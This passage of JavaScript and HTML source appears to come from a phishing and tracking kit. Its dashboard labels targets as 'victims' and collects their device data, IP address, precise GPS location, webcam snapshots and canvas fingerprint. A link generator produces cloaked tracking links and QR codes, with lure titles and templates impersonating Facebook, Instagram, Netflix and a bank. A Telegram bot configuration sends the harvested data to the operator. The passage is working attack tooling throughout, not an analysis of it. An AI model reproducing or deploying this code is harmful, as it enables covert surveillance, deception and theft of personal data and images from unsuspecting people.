                                            </a>
                                        </li>
                                        <li>
                                            <a href="javascript:void(0)" onclick="showTab('location-tab')" class="nav-link">
                                                <i class="fas fa-map-marker-alt"></i> Location
                                            </a>
                                        </li>
                                        <li>
                                            <a href="javascript:void(0)" onclick="showTab('camera-tab')" class="nav-link">
                                                <i class="fas fa-camera"></i> Camera
                                            </a>
                                        </li>
                                        <li>
                                            <a href="javascript:void(0)" onclick="showTab('fingerprint-tab')" class="nav-link">
                                                <i class="fas fa-fingerprint"></i> Fingerprint
                                            </a>
                                        </li>
                                        <li>
                                            <a href="javascript:void(0)" onclick="showTab('link-tab')" class="nav-link">
                                                <i class="fas fa-share-alt"></i> Link Generator
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                            
                            <div class="info-card glass-card mt-4">
                                <div class="card-header">
                                    <i class="fas fa-qrcode card-icon"></i> Quick ID
                                </div>
                                <div class="card-body text-center">
                                    <div class="qr-code mb-3" id="qr-code-container">
                                        <span>Scan to generate ID</span>
                                    </div>
                                    <p class="small">Victim ID: <span id="victim-id">${generateVictimID()}</span></p>
                                    <button class="btn btn-sm btn-outline-primary" onclick="generateNewVictimID()">
                                        <i class="fas fa-sync-alt"></i> Regenerate ID
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="col-lg-9">
                            <div class="info-card glass-card">
                                <div id="tab-content">
                                    <!-- Device Info Tab -->
                                    <div class="tab-pane active" id="info-tab">
                                        <h4 class="mb-4"><i class="fas fa-microchip text-primary"></i> Device Information</h4>
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="data-item">
                                                    <span class="data-label">Platform:</span>
                                                    <span class="data-value" id="platform-info">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">User Agent:</span>
                                                    <span class="data-value" id="user-agent">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Device Name:</span>
                                                    <span class="data-value" id="device-name">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Device Memory:</span>
                                                    <span class="data-value" id="device-memory">Loading...</span>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="data-item">
                                                    <span class="data-label">Screen Resolution:</span>
                                                    <span class="data-value" id="screen-resolution">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Color Depth:</span>
                                                    <span class="data-value" id="color-depth">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Pixel Ratio:</span>
                                                    <span class="data-value" id="pixel-ratio">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Orientation:</span>
                                                    <span class="data-value" id="orientation">Loading...</span>
                                                </div>
                                            </div>
                                        </div>
                                        <button class="btn btn-primary mt-3" onclick="refreshDeviceInfo()">
                                            <i class="fas fa-sync-alt"></i> Refresh Device Info
                                        </button>
                                    </div>
                                    
                                    <!-- Network Info Tab -->
                                    <div class="tab-pane" id="network-tab" style="display: none;">
                                        <h4 class="mb-4"><i class="fas fa-network-wired text-primary"></i> Network Information</h4>
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="data-item">
                                                    <span class="data-label">IPv4 Address:</span>
                                                    <span class="data-value" id="ipv4-address">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Connection Type:</span>
                                                    <span class="data-value" id="connection-type">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Data Saver:</span>
                                                    <span class="data-value" id="data-saver">Loading...</span>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="data-item">
                                                    <span class="data-label">Online Status:</span>
                                                    <span class="data-value" id="online-status">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Network Bandwidth:</span>
                                                    <span class="data-value" id="network-bandwidth">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">RTT (Round Trip Time):</span>
                                                    <span class="data-value" id="network-rtt">Loading...</span>
                                                </div>
                                            </div>
                                        </div>
                                        <button class="btn btn-primary mt-3" onclick="refreshNetworkInfo()">
                                            <i class="fas fa-sync-alt"></i> Refresh Network Info
                                        </button>
                                    </div>
                                    
                                    <!-- Location Tab -->
                                    <div class="tab-pane" id="location-tab" style="display: none;">
                                        <h4 class="mb-4"><i class="fas fa-map-marker-alt text-primary"></i> Location Information</h4>
                                        <div class="location-map mb-4" id="location-map">
                                            <div class="d-flex align-items-center justify-content-center h-100">
                                                <div class="text-center">
                                                    <i class="fas fa-globe-americas fa-3x text-secondary mb-3"></i>
                                                    <p>Map will appear here when location is accessed</p>
                                                    <button class="btn btn-primary" onclick="getLocation()">
                                                        <i class="fas fa-location-crosshairs"></i> Get Location
                                                    </button>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="data-item">
                                                    <span class="data-label">Latitude:</span>
                                                    <span class="data-value" id="latitude">Not retrieved yet</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Longitude:</span>
                                                    <span class="data-value" id="longitude">Not retrieved yet</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Accuracy:</span>
                                                    <span class="data-value" id="location-accuracy">Not retrieved yet</span>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="data-item">
                                                    <span class="data-label">Altitude:</span>
                                                    <span class="data-value" id="altitude">Not retrieved yet</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Speed:</span>
                                                    <span class="data-value" id="speed">Not retrieved yet</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Timestamp:</span>
                                                    <span class="data-value" id="location-timestamp">Not retrieved yet</span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <!-- Camera Tab -->
                                    <div class="tab-pane" id="camera-tab" style="display: none;">
                                        <h4 class="mb-4"><i class="fas fa-camera text-primary"></i> Camera Access</h4>
                                        <div class="row mb-4">
                                            <div class="col-md-6">
                                                <div class="camera-container">
                                                    <video id="camera-feed" class="camera-feed" autoplay playsinline></video>
                                                </div>
                                                <div class="text-center mt-3">
                                                    <button class="snapshot-btn" onclick="takeSnapshot()">
                                                        <i class="fas fa-camera"></i> Take Snapshot
                                                    </button>
                                                    <button class="btn btn-outline-primary ms-2" onclick="initializeCamera()">
                                                        <i class="fas fa-camera"></i> Start Camera
                                                    </button>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <h5>Snapshot Preview</h5>
                                                <canvas id="snapshot-canvas" class="snapshot-canvas" width="640" height="480"></canvas>
                                                <img id="snapshot-img" class="img-fluid rounded mt-3" alt="Snapshot" style="display:none; max-height: 200px;">
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <!-- Fingerprint Tab -->
                                    <div class="tab-pane" id="fingerprint-tab" style="display: none;">
                                        <h4 class="mb-4"><i class="fas fa-fingerprint text-primary"></i> Device & Browser Fingerprint</h4>
                                        <div class="fingerprint-canvas mb-4" id="fingerprint-canvas">
                                            <div class="d-flex align-items-center justify-content-center h-100">
                                                <div class="text-center">
                                                    <i class="fas fa-fingerprint fa-3x text-secondary"></i>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="data-item">
                                            <span class="data-label">Canvas Fingerprint:</span>
                                            <span class="data-value" id="canvas-fingerprint">Click to generate</span>
                                        </div>
                                        <div class="data-item">
                                            <span class="data-label">User Agent Hash:</span>
                                            <span class="data-value" id="useragent-hash">Click to generate</span>
                                        </div>
                                        <div class="data-item">
                                            <span class="data-label">Screen Hash:</span>
                                            <span class="data-value" id="screen-hash">Click to generate</span>
                                        </div>
                                        <div class="data-item">
                                            <span class="data-label">Time Zone:</span>
                                            <span class="data-value" id="timezone-fingerprint">${Intl.DateTimeFormat().resolvedOptions().timeZone}</span>
                                        </div>
                                        <button class="btn btn-primary mt-3" onclick="generateFingerprint()">
                                            <i class="fas fa-fingerprint"></i> Generate Fingerprint
                                        </button>
                                    </div>
                                    
                                    <!-- Link Generator Tab -->
                                    <div class="tab-pane" id="link-tab" style="display: none;">
                                        <h4 class="mb-4"><i class="fas fa-share-alt text-primary"></i> Link Generator</h4>
                                        
                                        <div class="telegram-config">
                                            <h5><i class="fas fa-link"></i> Generate Tracking Link</h5>
                                            
                                            <div class="mb-3">
                                                <label for="campaign-name" class="form-label">Campaign Name:</label>
                                                <input type="text" class="form-control" id="campaign-name" 
                                                       placeholder="e.g., Facebook Campaign, Email Marketing" 
                                                       value="Test Campaign">
                                            </div>
                                            
                                            <div class="mb-3">
                                                <label for="redirect-url" class="form-label">Redirect URL (After Scan):</label>
                                                <input type="url" class="form-control" id="redirect-url" 
                                                       placeholder="https://example.com" 
                                                       value="https://google.com">
                                                <div class="form-text">Where users will be redirected after data collection</div>
                                            </div>
                                            
                                            <div class="mb-3">
                                                <label for="cloak-title" class="form-label">Page Title:</label>
                                                <input type="text" class="form-control" id="cloak-title" 
                                                       placeholder="Free iPhone Giveaway!" 
                                                       value="üéÅ Free iPhone 15 Pro Max Giveaway!">
                                            </div>
                                            
                                            <div class="mb-3">
                                                <label class="form-label">Data to Collect:</label>
                                                <div class="row">
                                                    <div class="col-6">
                                                        <div class="form-check">
                                                            <input class="form-check-input" type="checkbox" id="collect-basic" checked>
                                                            <label class="form-check-label" for="collect-basic">
                                                                Basic Info
                                                            </label>
                                                        </div>
                                                        <div class="form-check">
                                                            <input class="form-check-input" type="checkbox" id="collect-location" checked>
                                                            <label class="form-check-label" for="collect-location">
                                                                Location
                                                            </label>
                                                        </div>
                                                    </div>
                                                    <div class="col-6">
                                                        <div class="form-check">
                                                            <input class="form-check-input" type="checkbox" id="collect-network" checked>
                                                            <label class="form-check-label" for="collect-network">
                                                                Network
                                                            </label>
                                                        </div>
                                                        <div class="form-check">
                                                            <input class="form-check-input" type="checkbox" id="collect-fingerprint" checked>
                                                            <label class="form-check-label" for="collect-fingerprint">
                                                                Fingerprint
                                                            </label>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            
                                            <div class="text-center">
                                                <button class="btn link-btn btn-lg" onclick="generateTrackingLink()">
                                                    <i class="fas fa-magic"></i> Generate Tracking Link
                                                </button>
                                            </div>
                                        </div>
                                        
                                        <div class="mt-4">
                                            <h5><i class="fas fa-history"></i> Generated Link</h5>
                                            <div id="generated-link-preview" class="link-preview">
                                                <div class="small text-warning">Link will appear here after generation</div>
                                            </div>
                                            <div class="text-end mt-3">
                                                <button class="btn btn-success" onclick="copyGeneratedLink()" id="copy-link-btn" style="display: none;">
                                                    <i class="fas fa-copy"></i> Copy Link
                                                </button>
                                            </div>
                                        </div>
                                        
                                        <div class="mt-4">
                                            <h5><i class="fas fa-qrcode"></i> QR Code</h5>
                                            <div class="qr-code" id="link-qr-code">
                                                <span>QR code will appear here</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Telegram Modal -->
                <div class="modal fade" id="telegramModal" tabindex="-1" aria-labelledby="telegramModalLabel" aria-hidden="true">
                    <div class="modal-dialog modal-lg">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title" id="telegramModalLabel">
                                    <i class="fab fa-telegram"></i> Send Data to Telegram
                                </h5>
                                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <div class="telegram-config">
                                    <h5><i class="fas fa-cog"></i> Configuration</h5>
                                    <div class="mb-3">
                                        <label for="bot-token" class="form-label">Bot Token:</label>
                                        <input type="text" class="form-control" id="bot-token" 
                                               placeholder="Enter your Telegram bot token" 
                                               value="${telegramConfig.botToken}">
                                        <div class="form-text">
                                            Get your bot token from <a href="https://t.me/BotFather" target="_blank">@BotFather</a>
                                        </div>
                                    </div>
                                    
                                    <div class="mb-3">
                                        <label for="chat-id" class="form-label">Chat ID:</label>
                                        <input type="text" class="form-control" id="chat-id" 
                                               placeholder="Enter your Telegram chat ID"
                                               value="${telegramConfig.chatId}">
                                        <div class="form-text">
                                            Get your chat ID by sending a message to <a href="https://t.me/userinfobot" target="_blank">@userinfobot</a>
                                        </div>
                                    </div>
                                    
                                    <div class="mb-3">
                                        <label class="form-label">Data to Send:</label>
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" id="send-device" checked>
                                            <label class="form-check-label" for="send-device">
                                                Device Information
                                            </label>
                                        </div>
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" id="send-network" checked>
                                            <label class="form-check-label" for="send-network">
                                                Network Information
                                            </label>
                                        </div>
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" id="send-location" checked>
                                            <label class="form-check-label" for="send-location">
                                                Location Information
                                            </label>
                                        </div>
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" id="send-fingerprint" checked>
                                            <label class="form-check-label" for="send-fingerprint">
                                                Fingerprint
                                            </label>
                                        </div>
                                    </div>
                                    
                                    <div class="text-center">
                                        <button class="btn telegram-btn btn-lg" onclick="sendDashboardDataToTelegram()">
                                            <i class="fab fa-telegram"></i> Send Data to Telegram
                                        </button>
                                        <button class="btn btn-outline-primary ms-2" onclick="testTelegramConnection()">
                                            <i class="fas fa-wifi"></i> Test Connection
                                        </button>
                                    </div>
                                </div>
                                
                                <div class="mt-4">
                                    <h5><i class="fas fa-history"></i> Send History</h5>
                                    <div id="telegram-history" class="small">
                                        <p class="text-muted">No data sent yet.</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Link Modal -->
                <div class="modal fade" id="linkModal" tabindex="-1" aria-labelledby="linkModalLabel" aria-hidden="true">
                    <div class="modal-dialog">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title" id="linkModalLabel">
                                    <i class="fas fa-link"></i> Quick Link Templates
                                </h5>
                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <div class="d-grid gap-2">
                                    <button class="btn btn-primary" onclick="useTemplate('facebook')">
                                        <i class="fab fa-facebook"></i> Facebook Login Template
                                    </button>
                                    <button class="btn btn-success" onclick="useTemplate('instagram')">
                                        <i class="fab fa-instagram"></i> Instagram Giveaway Template
                                    </button>
                                    <button class="btn btn-warning" onclick="useTemplate('netflix')">
                                        <i class="fab fa-netflix"></i> Netflix Free Trial Template
                                    </button>
                                    <button class="btn btn-danger" onclick="useTemplate('banking')">
                                        <i class="fas fa-university"></i> Banking Security Template
                                    </button>
                                </div>
                                <div class="mt-3">
                                    <p class="small text-muted">Select a template to pre-fill the link generator form.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            
            // Initialize dashboard
            initializeDashboard();
        }

        function showTab(tabId) {
            // Hide all tabs
            document.querySelectorAll('.tab-pane').forEach(tab => {
                tab.style.display = 'none';
            });
            
            // Remove active class from all nav links
            document.querySelectorAll('.nav-link').forEach(link => {
                link.classList.remove('active');
            });
            
            // Show selected tab
            const tab = document.getElementById(tabId);
            if (tab) {
                tab.style.display = 'block';
            }
            
            // Add active class to clicked nav link
            const navLinks = document.querySelectorAll('.nav-link');
            for (let link of navLinks) {
                if (link.textContent.includes(tabId.replace('-tab', ''))) {
                    link.classList.add('active');
                    break;
                }
            }
            
            // Special initialization for certain tabs
            if (tabId === 'camera-tab') {
                initializeCamera();
            } else if (tabId === 'fingerprint-tab') {
                generateFingerprint();
            }
        }

        function initializeDashboard() {
            // Load saved campaigns
            campaignManager.loadFromStorage();
            
            // Initial data collection
            refreshDeviceInfo();
            refreshNetworkInfo();
            
            // Generate initial victim ID
            generateNewVictimID();
        }

        // ============================================
        // DASHBOARD DATA COLLECTION FUNCTIONS
        // ============================================

        function refreshDeviceInfo() {
            // Platform
            document.getElementById('platform-info').textContent = navigator.platform || 'Unknown';
            
            // User Agent
            document.getElementById('user-agent').textContent = navigator.userAgent;
            
            // Device Name
            document.getElementById('device-name').textContent = getDeviceName();
            
            // Device Memory
            if (navigator.deviceMemory) {
                document.getElementById('device-memory').textContent = `${navigator.deviceMemory} GB`;
            } else {
                document.getElementById('device-memory').textContent = 'Not available';
            }
            
            // Screen Resolution
            document.getElementById('screen-resolution').textContent = `${window.screen.width} x ${window.screen.height}`;
            
            // Color Depth
            document.getElementById('color-depth').textContent = `${window.screen.colorDepth} bit`;
            
            // Pixel Ratio
            document.getElementById('pixel-ratio').textContent = window.devicePixelRatio || 1;
            
            // Orientation
            document.getElementById('orientation').textContent = window.screen.width > window.screen.height ? 'Landscape' : 'Portrait';
            
            showToast('Device information refreshed', 'success');
        }

        async function refreshNetworkInfo() {
            // Online Status
            document.getElementById('online-status').textContent = navigator.onLine ? 'Online' : 'Offline';
            
            // Connection Type
            if (navigator.connection) {
                const connection = navigator.connection;
                document.getElementById('connection-type').textContent = connection.effectiveType || 'Unknown';
                document.getElementById('network-rtt').textContent = `${connection.rtt || 'Unknown'} ms`;
                document.getElementById('data-saver').textContent = connection.saveData ? 'Enabled' : 'Disabled';
                
                if (connection.downlink) {
                    document.getElementById('network-bandwidth').textContent = `${connection.downlink} Mbps`;
                }
            } else {
                document.getElementById('connection-type').textContent = 'Not available';
                document.getElementById('network-rtt').textContent = 'Not available';
                document.getElementById('data-saver').textContent = 'Not available';
                document.getElementById('network-bandwidth').textContent = 'Not available';
            }
            
            // Get IP address
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                document.getElementById('ipv4-address').textContent = data.ip;
            } catch (error) {
                document.getElementById('ipv4-address').textContent = 'Unable to retrieve';
            }
            
            showToast('Network information refreshed', 'success');
        }

        function getLocation() {
            if (!navigator.geolocation) {
                showToast('Geolocation is not supported by your browser', 'error');
                return;
            }
            
            const mapElement = document.getElementById('location-map');
            mapElement.innerHTML = `
                <div class="d-flex align-items-center justify-content-center h-100">
                    <div class="text-center">
                        <div class="spinner-border text-primary mb-3" role="status">
                            <span class="visually-hidden">Loading...</span>
                        </div>
                        <p>Getting location...</p>
                    </div>
                </div>
            `;
            
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    document.getElementById('latitude').textContent = lat.toFixed(6);
                    document.getElementById('longitude').textContent = lon.toFixed(6);
                    document.getElementById('location-accuracy').textContent = `${accuracy.toFixed(2)} meters`;
                    
                    document.getElementById('altitude').textContent = position.coords.altitude ? 
                        `${position.coords.altitude.toFixed(2)} meters` : 'Not available';
                    document.getElementById('speed').textContent = position.coords.speed ? 
                        `${(position.coords.speed * 3.6).toFixed(2)} km/h` : 'Not available';
                    document.getElementById('location-timestamp').textContent = new Date(position.timestamp).toLocaleString();
                    
                    // Show map with location
                    mapElement.innerHTML = `
                        <div class="d-flex align-items-center justify-content-center h-100">
                            <div class="text-center">
                                <i class="fas fa-map-marked-alt fa-3x text-primary mb-3"></i>
                                <h5>Location Retrieved</h5>
                                <p class="small">Latitude: ${lat.toFixed(6)}</p>
                                <p class="small">Longitude: ${lon.toFixed(6)}</p>
                                <p class="small">Accuracy: ${accuracy.toFixed(2)} meters</p>
                                <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank" class="btn btn-sm btn-primary">
                                    <i class="fas fa-external-link-alt"></i> Open in Google Maps
                                </a>
                            </div>
                        </div>
                    `;
                    
                    showToast('Location retrieved successfully!', 'success');
                },
                function(error) {
                    let errorMessage = 'Unable to retrieve location';
                    
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = 'Location permission denied';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = 'Location information unavailable';
                            break;
                        case error.TIMEOUT:
                            errorMessage = 'Location request timed out';
                            break;
                    }
                    
                    mapElement.innerHTML = `
                        <div class="d-flex align-items-center justify-content-center h-100">
                            <div class="text-center text-danger">
                                <i class="fas fa-exclamation-triangle fa-3x mb-3"></i>
                                <p>${errorMessage}</p>
                                <button class="btn btn-sm btn-primary" onclick="getLocation()">
                                    <i class="fas fa-redo"></i> Try Again
                                </button>
                            </div>
                        </div>
                    `;
                    
                    showToast(errorMessage, 'error');
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        async function initializeCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                const videoElement = document.getElementById('camera-feed');
                if (videoElement) {
                    videoElement.srcObject = stream;
                }
                
                showToast('Camera started successfully', 'success');
            } catch (error) {
                showToast('Failed to access camera: ' + error.message, 'error');
                console.error('Camera error:', error);
            }
        }

        function takeSnapshot() {
            const videoElement = document.getElementById('camera-feed');
            const canvas = document.getElementById('snapshot-canvas');
            const imgElement = document.getElementById('snapshot-img');
            
            if (videoElement && videoElement.srcObject) {
                const context = canvas.getContext('2d');
                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                const dataURL = canvas.toDataURL('image/jpeg', 0.8);
                imgElement.src = dataURL;
                imgElement.style.display = 'block';
                
                // Store in deviceData
                deviceData.cameraInfo = {
                    snapshot: dataURL,
                    timestamp: new Date().toISOString()
                };
                
                showToast('Snapshot captured!', 'success');
            } else {
                showToast('Camera not available. Please start camera first.', 'error');
            }
        }

        function generateFingerprint() {
            // Canvas fingerprint
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            if (ctx) {
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.textBaseline = 'alphabetic';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Fingerprint', 4, 17);
                
                const canvasData = canvas.toDataURL();
                const canvasHash = simpleHash(canvasData);
                document.getElementById('canvas-fingerprint').textContent = canvasHash.substring(0, 16) + '...';
                
                // User agent hash
                const userAgentHash = simpleHash(navigator.userAgent);
                document.getElementById('useragent-hash').textContent = userAgentHash.substring(0, 16) + '...';
                
                // Screen hash
                const screenHash = simpleHash(`${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`);
                document.getElementById('screen-hash').textContent = screenHash.substring(0, 16) + '...';
                
                // Update deviceData
                deviceData.fingerprintInfo = {
                    canvas: canvasHash,
                    userAgent: userAgentHash,
                    screen: screenHash,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timestamp: new Date().toISOString()
                };
                
                showToast('Fingerprint generated successfully', 'success');
            }
        }

        // ============================================
        // LINK GENERATOR FUNCTIONS
        // ============================================

        function generateTrackingLink() {
            const campaignName = document.getElementById('campaign-name').value.trim() || 'Untitled Campaign';
            const redirectUrl = document.getElementById('redirect-url').value.trim() || 'https://google.com';
            const cloakTitle = document.getElementById('cloak-title').value.trim() || 'Secure Scan';
            
            // Generate unique campaign ID
            const campaignId = 'camp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            // Create the tracking link
            const currentUrl = window.location.origin + window.location.pathname;
            const trackingLink = `${currentUrl}?track=true&cid=${campaignId}&redirect=${encodeURIComponent(redirectUrl)}&title=${encodeURIComponent(cloakTitle)}`;
            
            // Save campaign
            const dataSettings = {
                collectBasic: document.getElementById('collect-basic').checked,
                collectLocation: document.getElementById('collect-location').checked,
                collectNetwork: document.getElementById('collect-network').checked,
                collectFingerprint: document.getElementById('collect-fingerprint').checked,
                redirectUrl: redirectUrl,
                cloakTitle: cloakTitle
            };
            
            const campaign = campaignManager.addCampaign(campaignName, trackingLink, dataSettings);
            
            // Display the generated link
            displayGeneratedLink(trackingLink, campaignId);
            
            showToast(`Tracking link generated for "${campaignName}"`, 'success');
        }

        function displayGeneratedLink(link, campaignId) {
            const linkPreview = document.getElementById('generated-link-preview');
            const copyBtn = document.getElementById('copy-link-btn');
            const qrContainer = document.getElementById('link-qr-code');
            
            linkPreview.innerHTML = `
                <div class="d-flex justify-content-between align-items-center">
                    <div>
                        <strong>Generated Link:</strong><br>
                        <span class="small">${link}</span>
                    </div>
                </div>
                <div class="mt-2 small text-muted">
                    Campaign ID: ${campaignId}<br>
                    Total Clicks: 0 | Data Collected: 0
                </div>
            `;
            
            copyBtn.style.display = 'block';
            
            // Generate QR code
            qrContainer.innerHTML = '';
            QRCode.toCanvas(link, { width: 150, height: 150 }, function(error, canvas) {
                if (error) {
                    qrContainer.innerHTML = '<span>QR code generation failed</span>';
                } else {
                    qrContainer.innerHTML = '';
                    qrContainer.appendChild(canvas);
                }
            });
        }

        function copyGeneratedLink() {
            const linkPreview = document.getElementById('generated-link-preview');
            const linkText = linkPreview.querySelector('.small');
            
            if (linkText) {
                const link = linkText.textContent.trim();
                navigator.clipboard.writeText(link).then(() => {
                    showToast('Link copied to clipboard!', 'success');
                }).catch(err => {
                    // Fallback for older browsers
                    const textarea = document.createElement('textarea');
                    textarea.value = link;
                    document.body.appendChild(textarea);
                    textarea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textarea);
                    showToast('Link copied to clipboard!', 'success');
                });
            }
        }

        function useTemplate(type) {
            let title = '';
            let redirectUrl = '';
            let cloakTitle = '';
            
            switch(type) {
                case 'facebook':
                    title = 'Facebook Security Alert';
                    redirectUrl = 'https://facebook.com';
                    cloakTitle = 'üîí Facebook Security Verification Required';
                    break;
                case 'instagram':
                    title = 'Instagram Giveaway';
                    redirectUrl = 'https://instagram.com';
                    cloakTitle = 'üéÅ Win iPhone 15 Pro Max - Official Instagram Giveaway';
                    break;
                case 'netflix':
                    title = 'Netflix Free Trial';
                    redirectUrl = 'https://netflix.com';
                    cloakTitle = 'üé¨ Netflix Premium 6 Months Free Trial';
                    break;
                case 'banking':
                    title = 'Bank Security Check';
                    redirectUrl = 'https://bank.com';
                    cloakTitle = 'üè¶ Security Verification Required - Online Banking';
                    break;
            }
            
            document.getElementById('campaign-name').value = title;
            document.getElementById('redirect-url').value = redirectUrl;
            document.getElementById('cloak-title').value = cloakTitle;
            
            // Close modal
            const modal = bootstrap.Modal.getInstance(document.getElementById('linkModal'));
            if (modal) modal.hide();
            
            // Switch to link tab
            showTab('link-tab');
            
            showToast(`${type} template loaded`, 'success');
        }

        // ============================================
        // TELEGRAM FUNCTIONS FOR DASHBOARD
        // ============================================

        function openTelegramModal() {
            // Create and show modal
            const modalHtml = `
                <div class="modal fade" id="telegramModalInstance" tabindex="-1">
                    <div class="modal-dialog modal-lg">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title">
                                    <i class="fab fa-telegram"></i> Send Data to Telegram
                                </h5>
                                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                            </div>
                            <div class="modal-body">
                                <div class="telegram-config">
                                    <h5><i class="fas fa-cog"></i> Configuration</h5>
                                    <div class="mb-3">
                                        <label for="modal-bot-token" class="form-label">Bot Token:</label>
                                        <input type="text" class="form-control" id="modal-bot-token" 
                                               value="${telegramConfig.botToken}">
                                    </div>
                                    
                                    <div class="mb-3">
                                        <label for="modal-chat-id" class="form-label">Chat ID:</label>
                                        <input type="text" class="form-control" id="modal-chat-id" 
                                               value="${telegramConfig.chatId}">
                                    </div>
                                    
                                    <div class="mb-3">
                                        <label class="form-label">Data to Send:</label>
                                        <div class="row">
                                            <div class="col-6">
                                                <div class="form-check">
                                                    <input class="form-check-input" type="checkbox" id="modal-send-device" checked>
                                                    <label class="form-check-label" for="modal-send-device">
                                                        Device Information
                                                    </label>
                                                </div>
                                                <div class="form-check">
                                                    <input class="form-check-input" type="checkbox" id="modal-send-network" checked>
                                                    <label class="form-check-label" for="modal-send-network">
                                                        Network Information
                                                    </label>
                                                </div>
                                            </div>
                                            <div class="col-6">
                                                <div class="form-check">
                                                    <input class="form-check-input" type="checkbox" id="modal-send-location" checked>
                                                    <label class="form-check-label" for="modal-send-location">
                                                        Location Information
                                                    </label>
                                                </div>
                                                <div class="form-check">
                                                    <input class="form-check-input" type="checkbox" id="modal-send-fingerprint" checked>
                                                    <label class="form-check-label" for="modal-send-fingerprint">
                                                        Fingerprint
                                                    </label>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="text-center">
                                        <button class="btn telegram-btn btn-lg" onclick="sendDashboardDataToTelegram()">
                                            <i class="fab fa-telegram"></i> Send Data to Telegram
                                        </button>
                                        <button class="btn btn-outline-primary ms-2" onclick="testTelegramConnection()">
                                            <i class="fas fa-wifi"></i> Test Connection
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            
            const modalDiv = document.createElement('div');
            modalDiv.innerHTML = modalHtml;
            document.body.appendChild(modalDiv);
            
            const modal = new bootstrap.Modal(modalDiv.querySelector('.modal'));
            modal.show();
            
            // Clean up after modal is hidden
            modalDiv.addEventListener('hidden.bs.modal', function() {
                document.body.removeChild(modalDiv);
            });
        }

        async function sendDashboardDataToTelegram() {
            try {
                // Get configuration from modal
                const botToken = document.getElementById('modal-bot-token')?.value || telegramConfig.botToken;
                const chatId = document.getElementById('modal-chat-id')?.value || telegramConfig.chatId;
                
                if (!botToken || !chatId) {
                    showToast('Please configure bot token and chat ID', 'error');
                    return;
                }
                
                // Update config
                telegramConfig.botToken = botToken;
                telegramConfig.chatId = chatId;
                
                // Collect current data
                await collectDashboardData();
                
                // Format message
                const message = formatDashboardTelegramMessage();
                
                // Send message
                await sendTelegramMessage(message);
                
                // Send JSON data
                const jsonData = JSON.stringify(deviceData, null, 2);
                await sendTelegramDocument(
                    new Blob([jsonData], { type: 'application/json' }),
                    `device-data-${Date.now()}.json`,
                    'Complete device information data'
                );
                
                showToast('Data sent to Telegram successfully', 'success');
                
                // Close modal
